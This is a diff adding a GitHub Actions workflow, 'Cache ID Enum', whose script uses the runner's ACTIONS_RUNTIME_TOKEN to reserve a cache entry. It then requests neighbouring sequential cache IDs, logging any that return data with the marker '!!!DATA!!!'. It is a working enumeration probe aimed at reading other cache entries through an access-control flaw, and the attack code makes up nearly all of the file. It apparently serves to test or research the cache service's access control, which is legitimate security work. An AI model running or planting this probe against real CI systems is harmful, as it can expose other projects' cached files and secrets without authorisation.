@@ -1,0 +1,51 @@
+name: Cache ID Enum
+on: workflow_dispatch
+permissions:
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/github-script@v7
+        with:
+          script: |
+            const token = process.env.ACTIONS_RUNTIME_TOKEN;
+            const cacheUrl = process.env.ACTIONS_CACHE_URL;
+            if (!cacheUrl) { console.log('NO CACHE URL'); return; }
+            
+            const headers = {
+              'Authorization': `Bearer ${token}`,
+              'Content-Type': 'application/json',
+              'Accept': 'application/json;api-version=6.0-preview.1'
+            };
+            
+            // Reserve a cache to get our cache ID
+            const version = require('crypto').createHash('sha256').update('test-path').digest('hex');
+            const key = `enum-test-${Date.now()}`;
+            
+            const reserve = await fetch(`${cacheUrl}_apis/artifactcache/caches`, {
+              method: 'POST', headers,
+              body: JSON.stringify({key, version})
+            });
+            const rt = await reserve.json().catch(() => ({}));
+            console.log(`Reserve: ${reserve.status} cacheId=${rt.cacheId}`);
+            
+            if (rt.cacheId) {
+              // Try sequential IDs around our ID
+              console.log(`\n=== Sequential cache ID access ===`);
+              for (const offset of [-2, -1, 0, 1, 2]) {
+                const id = rt.cacheId + offset;
+                const r = await fetch(`${cacheUrl}_apis/artifactcache/caches/${id}`, {
+                  headers: {'Authorization': `Bearer ${token}`, 'Accept': 'application/octet-stream'}
+                });
+                const status = r.status;
+                if (status === 200) {
+                  const size = r.headers.get('content-length');
+                  console.log(`  ID ${id} (offset ${offset}): ${status} SIZE=${size} !!!DATA!!!`);
+                } else if (status !== 404) {
+                  console.log(`  ID ${id} (offset ${offset}): ${status}`);
+                } else {
+                  console.log(`  ID ${id} (offset ${offset}): 404`);
+                }
+              }
+            }
